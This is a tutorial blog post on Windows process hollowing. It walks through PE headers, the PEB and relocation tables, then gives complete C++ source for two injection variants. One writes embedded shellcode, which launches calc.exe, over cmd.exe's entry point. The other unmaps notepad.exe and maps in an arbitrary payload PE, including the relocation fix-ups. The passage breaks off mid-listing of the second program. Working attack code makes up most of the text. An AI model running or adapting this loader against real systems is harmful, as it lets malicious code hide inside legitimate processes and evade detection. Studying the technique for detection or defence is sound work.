---
title: Process Hollowing and Base Relocations
slug: process-hollowing-and-base-relocations
date: 2026-05-16
tags:
  - Process-Injection
  - Windows
---
# Process Hollowing and Base Relocations

![](/images/1.gif)

## Process Hollowing

Process Hollowing is a technique where an attacker:

1. Spawns a legitimate process (like `notepad.exe` or `cmd.exe` ) in a suspended state.
2. Replaces or overwrites its executable content in memory.
3. Redirects execution to attacker's code.
4. Resumes the thread, the process now executes attacker code while appearing as legitimate to OS.

There are two variants that we will try in this blog:

<svg width="900" height="820" viewBox="0 0 900 820" xmlns="http://www.w3.org/2000/svg" font-family="sans-serif">

  <!-- Background -->
  

  <!-- ══ LEGEND ══ -->
  <rect x="30" y="14" width="840" height="62" rx="8" fill="none" stroke="#cccccc" stroke-width="1"/>
  <text x="450" y="32" text-anchor="middle" font-size="12" fill="#888">Describe</text>

  <rect x="56" y="42" width="13" height="13" rx="2" fill="#B5D4F4" stroke="#185FA5" stroke-width="0.8"/>
  <text x="76" y="53" font-size="12" fill="#333">Variant 1 — shellcode injection (cmd.exe)</text>

  <rect x="56" y="58" width="13" height="13" rx="2" fill="#C0DD97" stroke="#3B6D11" stroke-width="0.8"/>
  <text x="76" y="69" font-size="12" fill="#333">Variant 2 — process hollowing (notepad.exe)</text>

  <rect x="520" y="42" width="13" height="13" rx="2" fill="#D3D1C7" stroke="#5F5E5A" stroke-width="0.8"/>
  <text x="540" y="53" font-size="12" fill="#333">Shared step</text>

  <!-- ══ SHARED START ══ -->
  <rect x="280" y="96" width="340" height="52" rx="8" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="1"/>
  <text x="450" y="117" text-anchor="middle" font-size="13" font-weight="600" fill="#2C2C2A">Spawn process SUSPENDED</text>
  <text x="450" y="137" text-anchor="middle" font-size="11" fill="#5F5E5A">CreateProcess + CREATE_SUSPENDED</text>

  <!-- Fork arrows -->
  <line x1="360" y1="148" x2="170" y2="194" stroke="#888780" stroke-width="1.2" marker-end="url(#arr)"/>
  <line x1="540" y1="148" x2="730" y2="194" stroke="#888780" stroke-width="1.2" marker-end="url(#arr)"/>

  <!-- Fork labels -->
  <text x="220" y="184" text-anchor="middle" font-size="11" font-weight="600" fill="#185FA5">Variant 1</text>
  <text x="680" y="184" text-anchor="middle" font-size="11" font-weight="600" fill="#3B6D11">Variant 2</text>

  <!-- ══ VARIANT 1 — cx=170 ══ -->
  <rect x="60" y="198" width="220" height="52" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="1"/>
  <text x="170" y="219" text-anchor="middle" font-size="13" font-weight="600" fill="#0C447C">Read PEB → EntryPoint</text>
  <text x="170" y="239" text-anchor="middle" font-size="11" fill="#185FA5">NtQueryInformationProcess</text>
  <line x1="170" y1="250" x2="170" y2="280" stroke="#185FA5" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="60" y="284" width="220" height="52" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="1"/>
  <text x="170" y="305" text-anchor="middle" font-size="13" font-weight="600" fill="#0C447C">WriteProcessMemory</text>
  <text x="170" y="325" text-anchor="middle" font-size="11" fill="#185FA5">shellcode @ EntryPoint</text>
  <line x1="170" y1="336" x2="170" y2="366" stroke="#185FA5" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="60" y="370" width="220" height="52" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="1"/>
  <text x="170" y="391" text-anchor="middle" font-size="13" font-weight="600" fill="#0C447C">ResumeThread</text>
  <text x="170" y="411" text-anchor="middle" font-size="11" fill="#185FA5">execution at patched EP</text>
  <line x1="170" y1="422" x2="170" y2="452" stroke="#185FA5" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="60" y="456" width="220" height="52" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="1"/>
  <text x="170" y="477" text-anchor="middle" font-size="13" font-weight="600" fill="#0C447C">Shellcode runs</text>
  <text x="170" y="497" text-anchor="middle" font-size="11" fill="#185FA5">inside cmd.exe process</text>

  <!-- ══ VARIANT 2 — cx=730 ══ -->
  <rect x="620" y="198" width="220" height="52" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="1"/>
  <text x="730" y="219" text-anchor="middle" font-size="13" font-weight="600" fill="#27500A">Read PEB → ImageBase</text>
  <text x="730" y="239" text-anchor="middle" font-size="11" fill="#3B6D11">NtQueryInformationProcess</text>
  <line x1="730" y1="250" x2="730" y2="280" stroke="#3B6D11" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="620" y="284" width="220" height="52" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="1"/>
  <text x="730" y="305" text-anchor="middle" font-size="13" font-weight="600" fill="#27500A">NtUnmapViewOfSection</text>
  <text x="730" y="325" text-anchor="middle" font-size="11" fill="#3B6D11">unmap legitimate image</text>
  <line x1="730" y1="336" x2="730" y2="366" stroke="#3B6D11" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="620" y="370" width="220" height="52" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="1"/>
  <text x="730" y="391" text-anchor="middle" font-size="13" font-weight="600" fill="#27500A">VirtualAllocEx</text>
  <text x="730" y="411" text-anchor="middle" font-size="11" fill="#3B6D11">allocate space for new image</text>
  <line x1="730" y1="422" x2="730" y2="452" stroke="#3B6D11" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="620" y="456" width="220" height="52" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="1"/>
  <text x="730" y="477" text-anchor="middle" font-size="13" font-weight="600" fill="#27500A">Write full PE + sections</text>
  <text x="730" y="497" text-anchor="middle" font-size="11" fill="#3B6D11">WriteProcessMemory</text>
  <line x1="730" y1="508" x2="730" y2="538" stroke="#3B6D11" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="620" y="542" width="220" height="52" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="1"/>
  <text x="730" y="563" text-anchor="middle" font-size="13" font-weight="600" fill="#27500A">Relocate .reloc entries</text>
  <text x="730" y="583" text-anchor="middle" font-size="11" fill="#3B6D11">fix base-address delta</text>
  <line x1="730" y1="594" x2="730" y2="624" stroke="#3B6D11" stroke-width="1.2" marker-end="url(#arr)"/>

  <rect x="620" y="628" width="220" height="52" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="1"/>
  <text x="730" y="649" text-anchor="middle" font-size="13" font-weight="600" fill="#27500A">SetThreadContext + Resume</text>
  <text x="730" y="669" text-anchor="middle" font-size="11" fill="#3B6D11">redirect EIP/RIP to PE entry</text>

  <!-- ══ CONVERGE ARROWS ══ -->
  <path d="M170 508 L170 736 L280 736" fill="none" stroke="#888780" stroke-width="1.2" marker-end="url(#arr)"/>
  <path d="M730 680 L730 736 L620 736" fill="none" stroke="#888780" stroke-width="1.2" marker-end="url(#arr)"/>

  <!-- ══ SHARED END ══ -->
  <rect x="280" y="710" width="340" height="52" rx="8" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="1"/>
  <text x="450" y="731" text-anchor="middle" font-size="13" font-weight="600" fill="#2C2C2A">Attacker code in legit process</text>
  <text x="450" y="751" text-anchor="middle" font-size="11" fill="#5F5E5A">masquerading as cmd.exe / notepad</text>

  <!-- ══ ARROW MARKER ══ -->
  <defs>
    <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </marker>
  </defs>

</svg>
Variant 1 overwrites the entry point with shellcode, Variant 2 replaces the entire PE image. Lets start of with simple one, but before let's understand Windows PE structure format which is required for both variants.
## Windows PE Structure

```bash
┌─────────────────────────┐
│     DOS Header          │ -> "MZ" magic bytes, e_lfanew at 0x3C → offset to NT headers
├─────────────────────────┤
│     DOS Stub            │ -> "This program cannot be run in DOS mode"
├─────────────────────────┤
│     NT Headers          │ -> "PE\0\0" + FileHeader + OptionalHeader
│  ├── FileHeader         │     NumberOfSections, Machine type (x86=0x14C, x64=0x8664)
│  └── OptionalHeader     │     ImageBase, SizeOfImage, AddressOfEntryPoint, DataDirectory[]
├─────────────────────────┤
│  Section Headers[]      │ -> Array of IMAGE_SECTION_HEADER, one per section
├─────────────────────────┤
│     .text               │ -> Executable code
│     .data               │ -> Initialized data
│     .rdata              │ -> Read-only data (strings, vtables, imports)
│     .reloc              │ -> Relocation table ← VARIANT 2 CARES ABOUT THIS, note it
└─────────────────────────┘
```

Each data structure here can be explained in whole another new blog but we will just focus in key fields used throughout:

- `e_lfanew` DWORD at `DOS+0x3C`, it has offset from file start to NT headers
- `OptionalHeader.ImageBase` contains the **preferred** base address the linker compiled for
- `OptionalHeader.SizeOfImage` contains total memory footprint of the loaded image
- `OptionalHeader.AddressOfEntryPoint`  contains **RVA** (Relative Virtual Address) of the first instruction (not absolute address)
- `DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]` contains pointer to the `.reloc` section

We can look from PE-COFF File viewer on `cmd.exe`.

![](/img/elfanew.png)

That `000000F0` Offset to New EXE Header is `e_lfanew`, which contains address to NT Header start.

![](/img/ntheader.png)

And this is `IMAGE_OPTIONAL_HEADER`:

![](/img/CFF.png)
## Process Environment Block (PEB)

The Process Environment Block (PEB) is a user-mode structure that contains process-wide information. Unlike EPROCESS (which lives in kernel space), the PEB is mapped into the process's own address space, making it directly accessible from user-mode code.

The PEB is one of the most important structures in offensive development because:

1. **Module enumeration**: PEB->Ldr contains the list of all loaded DLLs
2. **API resolution**: Walking PEB->Ldr lets you find function addresses without calling GetModuleHandle/GetProcAddress (position-independent code)
3. **Anti-debugging**: PEB->BeingDebugged and NtGlobalFlag reveal debugger presence
4. **Process information**: Command line, environment, image path are all here
5. **No API calls needed**: Direct memory access, no hooks to worry about

There are different ways to access the PEB. On x64 Windows, the GS segment register base points to the TEB (Thread Environment Block), and the PEB pointer is at TEB offset 0x60.  But we will do using `NtQueryInformationProcess`.

```c
#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Function pointer for NtQueryInformationProcess
typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

int main() {

    // This structure will hold process info (including PEB pointer)
    PROCESS_BASIC_INFORMATION pbi;
    ZeroMemory(&pbi, sizeof(pbi));

    // Get NtQueryInformationProcess from ntdll.dll
    pfnNtQueryInformationProcess NtQueryInformationProcess =
        (pfnNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQueryInformationProcess"
        );

    if (!NtQueryInformationProcess) {
        printf("Failed to get function address\n");
        return 1;
    }

    // Query current process
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        NULL
    );

    if (status != 0) {
        printf("NtQueryInformationProcess failed: 0x%X\n", status);
        return 2;
    }

    // THIS is the PEB pointer
    PPEB pPeb = pbi.PebBaseAddress;

    printf("PEB Address: %p\n", pPeb);

    return 0;
}
```
## Shellcode / Entry Point Overwrite (No Relocation)

This idea is quite simple:

1. Spawn `cmd.exe` or any target suspended.
2. Find where the process's entry point is in memory (using the Process Environment Block (PEB)).
3. Overwrite those bytes with the shellcode.
4. Resume the thread, it jumps straight to our shellcode.

In this process, we are not unmapping anything. We are not dealing with sections or relocations. We are just patching a small region of memory at entry point with raw shellcode, then letting the thread run. The process still has the original disk, only in memory bytes are the entry point are changed.
### Reading the PEB via `NTQueryInformationProcess`

Variant 1 uses a cleaner, higher-level approach to find the PEB:

```c
#include <windows.h>
#include <winternl.h>

// NtQueryInformationProcess gives us PROCESS_BASIC_INFORMATION,
// which directly contains PebBaseAddress, no register tricks needed.

PROCESS_BASIC_INFORMATION pbi = { 0 };
ULONG returnLength;

NtQueryInformationProcess(
    pi.hProcess,              // handle to the suspended process
    ProcessBasicInformation,  // query class gives us PEB pointer
    &pbi,                     // output buffer
    sizeof(pbi),
    &returnLength
);
```

`PROCESS_BASIC_INFORMATION` layout (simplified):

```c
Offset 0x00  NTSTATUS   ExitStatus
Offset 0x08  PVOID      PebBaseAddress      
Offset 0x10  ULONG_PTR  AffinityMask
Offset 0x18  LONG       BasePriority
Offset 0x20  ULONG_PTR  UniqueProcessId
Offset 0x28  ULONG_PTR  InheritedFromUniqueProcessId
```

We want that `PebBaseAddress`. After the call `pbi.PebBaseAddress` points to the PEB of suspended process. From the PEB, `ImageBaseAddress` lives at offset `0x10` in x64.

```c
// ImageBase is always at PEB + 0x10 on x64
auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

LPVOID baseAddress = 0;
SIZE_T bytesRead = 0;
ReadProcessMemory(
    pi.hProcess,
    lpBaseAddress,
    &baseAddress,
    8,              // 8 bytes for a 64-bit pointer
    &bytesRead
);
// baseAddress now holds cmd.exe's load address in memory
```

Now we have the base. From there, parse the DOS and NT headers to reach 
`AddressOfEntryPoint`:

```c
IMAGE_DOS_HEADER dHeader = { 0 };
ReadProcessMemory(pi.hProcess, baseAddress, &dHeader, sizeof(dHeader), &bytesRead);

// e_lfanew is the offset to NT headers
auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

IMAGE_NT_HEADERS ntHeaders = { 0 };
ReadProcessMemory(pi.hProcess, lpNtHeader, &ntHeaders, sizeof(ntHeaders), &bytesRead);

// AddressOfEntryPoint is an RVA, add base to get absolute address
auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);
```

There is also another method for it using `GetThreadContext` both method get you to same place but they do it differently. `NtQueryInformationProcess` is at Higher level NTAPI and we hold PEB pointer from `pbi.PebBaseAddress` directly while `GetThreadContext` + `ReadProcessMemory` works at Lower level (requires knowing register conventions) and we hold PEB pointer from `rdx` register in x64 and `ebx` register in x86. 

Full code:

```cpp
#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
                HANDLE ProcessHandle,
                PROCESSINFOCLASS ProcessInformationClass,
                PVOID ProcessInformation,
                ULONG ProcessInformationLength,
                PULONG ReturnLength
                );

// calc shellcode
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int main() {

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // 1. Create suspended process
        CreateProcessA(
                        "C:\\Windows\\System32\\cmd.exe",
                        NULL,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_SUSPENDED,
                        NULL,
                        NULL,
                        &si,
                        &pi
                      );

        // 2. Get NtQueryInformationProcess
        pfnNtQueryInformationProcess NtQueryInformationProcess =
                (pfnNtQueryInformationProcess)GetProcAddress(
                                GetModuleHandleA("ntdll.dll"),
                                "NtQueryInformationProcess"
                                );

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLen = 0;

        // 3. Get PEB
        NtQueryInformationProcess(
                        pi.hProcess,
                        ProcessBasicInformation,
                        &pbi,
                        sizeof(pbi),
                        &returnLen
                        );

        // 4. Read ImageBase from PEB (x64 = +0x10)
        LPVOID imageBase = NULL;
        SIZE_T bytesRead = 0;

        ReadProcessMemory(
                        pi.hProcess,
                        (PBYTE)pbi.PebBaseAddress + 0x10,
                        &imageBase,
                        sizeof(LPVOID),
                        &bytesRead
                        );

        // 5. Read DOS header
        IMAGE_DOS_HEADER dos = { 0 };

        ReadProcessMemory(
                        pi.hProcess,
                        imageBase,
                        &dos,
                        sizeof(dos),
                        &bytesRead
                        );

        // 6. Read NT headers
        IMAGE_NT_HEADERS nt = { 0 };

        ReadProcessMemory(
                        pi.hProcess,
                        (PBYTE)imageBase + dos.e_lfanew,
                        &nt,
                        sizeof(nt),
                        &bytesRead
                        );

        // 7. Compute EntryPoint
        LPVOID entryPoint = (PBYTE)imageBase +
                nt.OptionalHeader.AddressOfEntryPoint;

        // 8. Overwrite EntryPoint with shellcode
        WriteProcessMemory(
                        pi.hProcess,
                        entryPoint,
                        shellcode,
                        sizeof(shellcode),
                        NULL
                        );

        printf("[+] cmd.exe created suspended. PID: %lu\n", pi.dwProcessId);
        printf("[*] Check Process Hacker now, then press ENTER to run shellcode...\n");
        getchar();

        // 9. Resume execution
        ResumeThread(pi.hThread);

        return 0;
}
```

```bash
x86_64-w64-mingw32-g++ Variant1.cpp -o Variant1.exe -static
```

In entry-point overwrite techniques, the payload does not modify the process structure itself. Instead, it hijacks execution flow at runtime. If the shellcode spawns a new process, forensic tools will show that process independently, breaking the illusion of in-place execution. True Process Hollowing requires replacing the entire PE image in memory to maintain process consistency.

Our shellcode contains `calc.exe` so it literally does:

```c
WinExec("calc.exe");
```

Because:

- `calc.exe` is created by Windows API (`WinExec` / `CreateProcess`)
- not part of cmd.exe memory image
- so it becomes a **separate process tree node**
## Process Hollowing with Relocation Handling

Most snippets for Process Hollowing work fine only when the payload loads at the preferred base address. The moment ASLR kicks in and Windows decides to load it somewhere else, the injected code crashes. Because absolute addresses inside the PE are baked in at compile time. If the code is loaded at a different base, every hardcoded address is now wrong. This is what the relocation table `.reloc` section is for, it tells the loader every address it needs to patch.

When working with Windows Internals and techniques like process hollowing two concepts repeatedly appear: relocations and `NtUnmapViewOfSection`. At first glance, they look like low-level implementation details, but they actually represent fundamental parts of how windows loader manages executable memory.

```cpp
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
```

`NtUnmapViewOfSection` is an undocumented Windows NT system call that removes a mapped section (such as an executable image) from a process's virtual memory.

When Windows starts a process like `cmd.exe`, it:

1. Maps the executable into memory
2. Sets up memory sections (.text, .data, etc.)
3. Begins execution at the entry point

This mapping is treated as a **single memory-backed image**. Calling `NtUnmapViewOfSection` effectively tells Windows: "Remove this executable image from memory entirely".

Every PE file is compiled with a **preferred base address**:

```
ImageBase = 0x140000000
```

This is where the program _expects_ to be loaded. However, Windows does not guarantee this address. If it is already occupied, the loader places the executable elsewhere:

```
ActualBase = 0x150000000
```

Now every absolute address inside the binary becomes invalid. To solve this, Windows uses **relocations**. The `.reloc` section contains a table of fixes that tell the loader:  "If the image is not loaded at its preferred base, adjust these addresses."

This is the structure of RELOCATION_BLOCK. Each block maps to one 4KB page in the process virtual address space.

```c
typedef struct RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} RELOCATION_BLOCK;
```

Each relocation block represents a **4KB memory page**. Windows memory management is page-based, the standard page size is 0x1000 bytes, so relocations are grouped per page for efficiency.

This is the structure of Relocation Entry, Each entry describes a single address fix inside a page:

```c
typedef struct RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   : 4;
} RELOCATION_ENTRY;
```

A 16-bit value is split into:

- **Offset (12 bits):** Position inside the 4KB page
- **Type (4 bits):** Type of relocation

This design reflects how Windows optimizes memory layout and parsing efficiency.

`Header.h`:

```c
// Header.h

#pragma once
#include <windows.h>

// NtUnmapViewOfSection is an undocumented NT API.
// Not in standard headers, so we define it and resolve at runtime via ntdll.
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(HANDLE ProcessHandle, PVOID BaseAddress);

// Represents a relocation block in the .reloc section.
// Each block corresponds to one 4KB memory page.
typedef struct RELOCATION_BLOCK {
    DWORD PageAddress;  // RVA of the page
    DWORD BlockSize;    // Size of this block including entries
} RELOCATION_BLOCK, *PRELOCATION_BLOCK;

// Represents a single relocation entry inside a page.
// Uses bitfields: 12-bit offset within page, 4-bit relocation type.
typedef struct RELOCATION_ENTRY {
    USHORT Offset : 12;  // Offset inside 4KB page
    USHORT Type   : 4;   // Relocation type
} RELOCATION_ENTRY, *PRELOCATION_ENTRY;
```
### Spawning Suspended Host Process

The first stage of process hollowing begins by creating a legitimate Windows process in a suspended state. In this case, `notepad.exe` is launched using `CreateProcessA` with the `CREATE_SUSPENDED` flag. This ensures that the process is fully initialized in memory but its main thread does not execute. At this point, the process behaves like a normal Windows process with valid memory mappings and system structures, but it remains frozen, allowing us to safely modify it before execution begins.

```c
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi = {};

printf("[+] Creating Notepad.exe as Suspended Process.\n");

CreateProcessA(
    "C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL,
    &si, &pi
);
```
### Extracting the PEB via Thread Context

After the process is created, the next step is to extract the thread context. The thread context contains CPU register values at the time of suspension. These registers are critical because they contain pointers into internal process structures such as the Process Environment Block (PEB). The PEB is accessed differently depending on architecture: on x64 systems it is referenced through the `RDX` register, while on x86 it is accessed via `EBX`. From the PEB, we can retrieve the base address of the executable image currently loaded in the process.

```c
CONTEXT ctx = {};
ctx.ContextFlags = CONTEXT_FULL;

GetThreadContext(pi.hThread, &ctx);
```
### Reading Image Base from PEB

```c
PVOID baseAddress = NULL;

#ifdef _WIN64
ReadProcessMemory(pi.hProcess,
    (PBYTE)ctx.Rdx + 0x10,
    &baseAddress, sizeof(PVOID), NULL);
#else
ReadProcessMemory(pi.hProcess,
    (PBYTE)ctx.Ebx + 0x8,
    &baseAddress, sizeof(PVOID), NULL);
#endif
```
### Unmapping the Original Process Image

```c
auto NtUnmapViewOfSection =
    (_NtUnmapViewOfSectionFunc)GetProcAddress(
        GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");

NtUnmapViewOfSection(pi.hProcess, baseAddress);
```

At this point, the original executable image is removed from memory using `NtUnmapViewOfSection`. Unmapping the original image clears the memory region, effectively preparing the process for a full replacement of its executable content.
### Loading the Payload PE from Disk

```c
HANDLE file = CreateFileA(argv[1], GENERIC_READ, 0, NULL,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

DWORD size = GetFileSize(file, NULL);
char* PEBytes = (char*)malloc(size);

DWORD read;

ReadFile(file, PEBytes, size, &read, NULL);
CloseHandle(file);

PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)PEBytes;
PIMAGE_NT_HEADERS nt =
    (PIMAGE_NT_HEADERS)(PEBytes + dos->e_lfanew);
```

Here the payload executable is loaded into memory as a raw byte array. At this stage, the PE is still in file format and has not been mapped into virtual memory. By parsing the DOS and NT headers, we extract critical metadata such as the image size, section layout, and entry point. This information is required to correctly reconstruct the executable inside the target process.
### Allocating Memory in the Target Process

```c
PVOID alloc = VirtualAllocEx(
    pi.hProcess,
    baseAddress,
    nt->OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

Memory is now allocated inside the suspended process using `VirtualAllocEx`. The goal is to allocate memory at the same base address as the original process image. If this succeeds, no relocation is required. If it fails or returns a different address, the binary must later be relocated. The allocated memory acts as the new container for the injected PE image.
### Writing PE Headers and Sections

```c
WriteProcessMemory(pi.hProcess,
    alloc,
    PEBytes,
    nt->OptionalHeader.SizeOfHeaders,
    NULL);

PIMAGE_SECTION_HEADER sec =
    (PIMAGE_SECTION_HEADER)(PEBytes + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {

    WriteProcessMemory(
        pi.hProcess,
        (PBYTE)alloc + sec[i].VirtualAddress,
        PEBytes + sec[i].PointerToRawData,
        sec[i].SizeOfRawData,
        NULL
    );
}
```

This stage reconstructs the PE inside the remote process. First, the PE headers are written into memory, followed by each individual section. Each section from the file is mapped into its correct virtual address inside the target process. This step effectively rebuilds the executable in memory exactly as the Windows loader would normally do during process creation.
### Relocation Handling (When Base Changes)

```c
// Run relocation only if image is not at preferred base
if (baseOffset) {

    // Find the raw file offset of the .reloc section
    DWORD relocAddress = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".reloc", 6) == 0) {
            relocAddress = sec[i].PointerToRawData;
            break;
        }
    }

    // Get relocation directory from PE optional header
    IMAGE_DATA_DIRECTORY relocData =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    DWORD offset = 0;

    // Walk through entire .reloc section
    while (offset < relocData.Size) {

        // Each block represents one 4KB memory page
        PRELOCATION_BLOCK block =
            (PRELOCATION_BLOCK)(PEBytes + relocAddress + offset);

        offset += sizeof(RELOCATION_BLOCK);

        // Entries follow immediately after block header
        PRELOCATION_ENTRY entries =
            (PRELOCATION_ENTRY)(PEBytes + relocAddress + offset);

        // Number of relocation entries in this block
        DWORD count =
            (block->BlockSize - sizeof(RELOCATION_BLOCK)) /
            sizeof(RELOCATION_ENTRY);

        for (int i = 0; i < (int)count; i++) {

            // Skip type 0 entries (padding)
            if (entries[i].Type == 0)
                continue;

            // Calculate exact memory location to patch
            DWORD field =
                block->PageAddress + entries[i].Offset;

            // Read original pointer from target process
            DWORD64 value = 0;

            ReadProcessMemory(
                pi.hProcess,
                (PBYTE)alloc + field,
                &value,
                sizeof(PVOID),
                0
            );

            // Apply base delta (fix relocation)
            value += baseOffset;

            // Write corrected address back
            WriteProcessMemory(
                pi.hProcess,
                (PBYTE)alloc + field,
                &value,
                sizeof(PVOID),
                0
            );
        }

        // Advance past all entries to the next block
        offset += count * sizeof(RELOCATION_ENTRY);
    }
}
```

This stage patches every absolute address inside the injected binary that was baked in at compile time. Each relocation block represents a 4KB page, and each entry within that block specifies a memory offset that must be corrected. The process reads each address, applies the base offset, and writes the corrected value back into memory. Without this step, the executable would crash due to invalid memory references.
### Setting Execution Context and Starting the Process

```c
// Update the PEB's ImageBase to reflect the new location,
// then set the thread's entry point register to the payload's entry point
#ifdef _WIN64
WriteProcessMemory(pi.hProcess,
    (PBYTE)ctx.Rdx + 0x10,
    &nt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
ctx.Rcx = (DWORD64)((PBYTE)alloc + nt->OptionalHeader.AddressOfEntryPoint);
#else
WriteProcessMemory(pi.hProcess,
    (PBYTE)ctx.Ebx + 0x8,
    &nt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
ctx.Eax = (DWORD)((PBYTE)alloc + nt->OptionalHeader.AddressOfEntryPoint);
#endif

SetThreadContext(pi.hThread, &ctx);

ResumeThread(pi.hThread);
```

The final step is to redirect execution to the newly injected image. The thread context is modified so that the instruction pointer points to the payload's entry point. On x64 systems, this is done through the `RCX` register. Once the context is updated, `SetThreadContext` applies the changes, and `ResumeThread` starts execution. At this point, the original `notepad.exe` image is no longer active, and the process begins executing the injected PE.

Full code:

```cpp
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include "Header.h"

int main(int argc, char* argv[]) {

    if (argc != 2) {
        printf("Usage: ProcHoll.exe <payload.exe>\n");
        return 0;
    }

    // Create notepad.exe in a suspended state so its memory can be
    // modified before the main thread begins executing
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL,
        &si, &pi
    );

    // Retrieve the suspended thread's CPU register state.
    // We need this to locate the PEB and later redirect the entry point.
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Read the image base address from the PEB.
    // On x64: RDX holds the PEB address, ImageBase is at PEB + 0x10.
    // On x86: EBX holds the PEB address, ImageBase is at PEB + 0x8.
    PVOID baseAddress = NULL;

#ifdef _WIN64
    ReadProcessMemory(pi.hProcess,
        (PBYTE)ctx.Rdx + 0x10,
        &baseAddress, sizeof(PVOID), NULL);
#else
